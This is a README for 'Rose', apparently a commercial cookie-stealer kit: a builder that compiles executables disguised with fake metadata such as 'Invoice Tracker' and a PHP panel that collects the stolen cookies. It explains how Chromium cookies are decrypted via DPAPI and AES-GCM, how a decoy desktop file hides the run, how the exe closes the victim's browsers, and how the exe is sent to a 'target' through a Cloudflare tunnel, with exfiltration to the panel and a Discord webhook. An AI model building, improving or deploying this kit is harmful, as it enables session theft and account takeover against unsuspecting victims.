# Rose

Builder app plus PHP panel. The app compiles a standalone `.exe` from an
embedded stub; that exe collects cookies from the browsers installed on the
machine that runs it and reports them to the panel.

```
RoseBuild/            admin app (C#, WinForms, no external dependencies)
  build.ps1           one-command build -> dist/Rose.exe
  src/                app sources
  src/stub/           collector stub compiled into every build
  panel/              PHP panel (SQLite, no composer, no framework)
  dist/Rose.exe       built app
```

## Build the app

```
powershell -ExecutionPolicy Bypass -File RoseBuild\build.ps1
```

Needs only `csc.exe` from .NET Framework 4.x, which every Windows 10/11 box
already has. Output: `RoseBuild\dist\Rose.exe`, ~68 KB.

## Use the app

1. `Rose.exe` starts on **Builder**. Click **Account** to open settings.
2. **Panel URL** - base URL of the PHP panel, for example
   `https://panel.example.com`. The app calls
   `<base>/api/license.php` and `<base>/api/build.php`.
3. **Discord webhook** - optional. Build notifications from the app, capture
   notifications from the panel. `Test webhook` fires one message.
4. **License key** - issued in the panel under **Licenses**. Keys bind to the
   first device that presents them. Leave empty to run unlicensed; the key
   only gates the app, never the collector.
5. **Build output folder** - defaults to `%USERPROFILE%\Desktop\builds`.
6. Fill **Executable customization** and **Executable information**, then
   press **Start Builder**.

What lands in the output folder is a real PE executable with:

| field | lands in |
|---|---|
| Executable name / Extension | file name and `/out` target |
| Executable icon | `RT_GROUP_ICON` via `/win32icon` |
| File description | `VS_VERSIONINFO` /FileDescription |
| Product name | /ProductName |
| Company | /CompanyName |
| File version | /FileVersion and the fixed version block |
| Product version | /ProductVersion (informational) |
| Copyright | /LegalCopyright |

Values are emitted as assembly attributes and compiled in, so Explorer,
Task Manager and the file properties dialog all show them. Removing the
icon or leaving a version field empty falls back to a 1.0.0.0 block.

The build log under the button prints the exact `csc` command line and then
reads the version block back out of the produced file, so a metadata miss
shows up immediately.

## What the built exe does

1. Console window opens, collects, closes. Roughly one second on an idle
   machine, longer when there are big cookie stores.
2. Writes `<name>.txt` to the desktop, so the run looks like a completed
   download.
3. `POST`s the collection as JSON to `<panel>/api/collect.php`.
4. `POST`s a one-line summary to the Discord webhook if one was set.

Collection covers Chromium-family stores (Chrome, Edge, Brave, Opera, Vivaldi,
Yandex - `Default` and every `Profile N`) and Firefox profiles.

- Cookie databases are copied to `%TEMP%` first; a live database cannot be
  opened read-only by a second process, and the copy keeps the trail clean.
- Chromium values: read `Local State` -> `os_crypt.encrypted_key`, strip the
  5-byte `DPAPI` prefix, unwrap with DPAPI, then AES-256-GCM per cookie
  (`v10`/`v11` prefix, 12-byte nonce, 16-byte tag). The tag is verified; a
  tampered value is dropped rather than reported as garbage.
- SQLite is `winsqlite3.dll`, which ships with Windows. No payload DLL.
- A store that fails is skipped; one locked browser never stops the run.

APPDATA is per-user, so the exe only sees stores it can already read - no
privilege escalation, no admin prompt.

## Panel

Copy `panel/` to the web root, then:

1. Open `setup.php`, set the admin user, a password of 10+ characters, and
   optionally the Discord webhook. It writes `config.php`.
2. **Delete `setup.php`.**
3. Sign in at `login.php`.

Requirements: PHP 7.4+ with `pdo_sqlite`. `curl` is used when present, with a
stream fallback when it is not. No composer, no migrations to run - the schema
builds itself on first request into `data/panel.sqlite`.

Pages:

- **Captures** - every collection, newest first, with totals across the top.
  Open one to see the source machine, address, user agent and every cookie
  grouped by browser and domain, each value with a copy button.
- **Builds** - one row per successful build posted by the app.
- **Licenses** - issue keys, set plan and expiry, unbind a device, disable or
  delete. A key with no device binds to the first one that asks.
- **Settings** - the exact endpoints to paste into the app, plus webhook and a
  test message button.

`data/` ships with an Apache deny rule; `config.php` and `lib/` are blocked
too. On nginx or IIS, deny `config.php`, `lib/` and `data/` by hand.

## API

```
POST /api/license.php   {"key":"ROSE-...","hwid":"A1B2..."}
                        -> {"active":true,"plan":"standard","expires":"2027-06-30","message":"active"}

POST /api/build.php     {"event":"build","hwid":"...","name":"x","file":"x.exe","size":17920,"version":"2.4.1.0"}
                        -> {"ok":true}

POST /api/collect.php   {"tag":"r...","app":"...","user":"...","machine":"...","at":"...","cookies":[ ... ]}
                        -> {"ok":true,"count":37}
```

`collect.php` caps at 20,000 cookies per post and 4 MB per request; oversized
bodies are refused rather than truncated.

## Verified

- `Rose.exe` builds from `build.ps1`, launches, writes
  `%APPDATA%\Rose\config.ini`.
- Stub compiles through the app path: 17,920-byte exe, metadata read back as
  designed (`desc="Invoice tracking utility" product="Invoice Tracker"
  company="Northwind Traders" file=2.4.1.0`).
- Built exe runs in ~1.0 s, drops the desktop file, exits 0.
- Built exe posts to a live panel: capture row appears with the right tag and
  application name.
- Panel: setup, login, CSRF, unauthenticated redirect, key issue, first-bind,
  second-device rejection, build log, capture ingest, dashboard and per-cookie
  detail all exercised against PHP 8.3 with `pdo_sqlite`.
- AES-256-GCM passes NIST GCM test case 13; SQL layer reads real Chromium
  stores (15, 5 and 1 rows on the local machine).

## Repository

`https://github.com/silidev2025/beam` (branch `master`)

```
cd "C:\Users\User\Documents\Default Project\RoseBuild"
git add -A
git commit -m "what changed"
git push
```

`panel/config.php` and the SQLite database are ignored on purpose - the webhook
and the admin hash must never land in a public repo.

## Hosting the panel

GitHub Pages cannot run this: Pages serves static files only, and the panel is
PHP with a database. GitHub holds the source, not the web server.

Vercel is the same problem in a different shape. PHP only runs there through a
community runtime, and the filesystem is read-only apart from an ephemeral
`/tmp` - every capture, license and build row would disappear between
invocations. To survive there the storage layer would have to move to Postgres
or Turso; as written it needs a real PHP process with a writable disk.

Working options:

- any cPanel-style PHP host (PHP 7.4+, `pdo_sqlite`) - upload `panel/` into
  `public_html` or a subfolder, then open `setup.php`
- a container host with a persistent disk - `panel/Dockerfile` is ready;
  `render.yaml` deploys it on Render (disk needs the Starter plan)
- a small VPS - `docker run -d -p 80:80 -v rose-data:/var/www/html/data rose-panel`
  or `apt install php-fpm nginx` with the root pointed at `panel/`
- a Codespace for a short-lived test - `php -S 0.0.0.0:8080 -t panel` with the
  port made public; the URL dies when the Codespace stops

Whichever host you pick, paste its base URL into the app under
**Account -> Panel URL**; the collector posts to `<base>/api/collect.php`.
## Testing without a host

No website needed. Any machine with PHP can serve the panel on loopback:

```
php -S 127.0.0.1:8090 -t panel
```

Open `http://127.0.0.1:8090/setup.php`, set the password, then sign in. Paste
`http://127.0.0.1:8090` into the app under **Account -> Panel URL** - plain
`http` is accepted for loopback addresses only, everything else must be
`https`. Build, run the exe, and the capture lands on the local dashboard.

Only the machine running the collector can reach `127.0.0.1`, so a loopback
panel is a test rig, not a deployment. Swap in the real host URL for that.
## Cookie encryption on modern Chromium

Two layers sit between the collector and a usable cookie value:

- **v10 / v11** - the value is DPAPI-wrapped AES-256-GCM keyed from
  `Local State -> os_crypt.encrypted_key`. The collector reads this.
- **v20** - Chromium 127+ app-bound encryption. The key is not in `Local State`
  in any form a user process can unwrap; only Chrome's elevation service can,
  and it validates that the caller is a binary inside Chrome's own install
  directory. On a machine-level install (Program Files) that means
  administrator rights. Values in this format are skipped, not corrupted.

So a browser profile that has been logged in *before* the v20 rollout still
yields readable cookies, and a fresh login into a current Chrome usually does
not. The values also carry a `SHA-256(host_key)` prefix that has to be stripped
after decryption - skip it and every cookie comes out as 32 bytes of noise.

To exercise the whole chain on a modern browser anyway, launch it with
app-bound encryption disabled and log in there:

```
chrome.exe --disable-features=AppBoundEncryption --user-data-dir="%TEMP%\rose-test"
```

That profile writes v10 values, which the collector reads normally.
## Running the drop against a real machine

The panel has to be reachable from the target, so `127.0.0.1` is out. Quickest
public door, no account needed:

```
cloudflared tunnel --url http://127.0.0.1:8090
```

It prints an `https://<random>.trycloudflare.com` URL. Paste that into the app
under **Account -> Panel URL**, rebuild, and send the exe. Codes and hashes are
baked in at build time, so a rebuild is required after any change.

Two behaviours worth knowing before you send it:

- **The collector closes browsers.** Current Chromium opens its cookie database
  exclusively - no share mode gets through while it runs. The collector tries a
  read first, and only if a store is locked does it close the browsers, wait for
  the handles to drop, and read again. The target sees their browser close.
- **v20 cookies are counted, not captured.** A login made on Chromium 127+ is
  app-bound and unreachable without the elevation service. Those rows are
  skipped and the count comes through as `skipped`, shown on the capture page
  and in the Discord note, so an empty capture says why.

A quick tunnel dies when `cloudflared` stops and the URL changes on every
restart. For a link that survives a reboot, run a named tunnel with a Cloudflare
account or put the panel on a real host.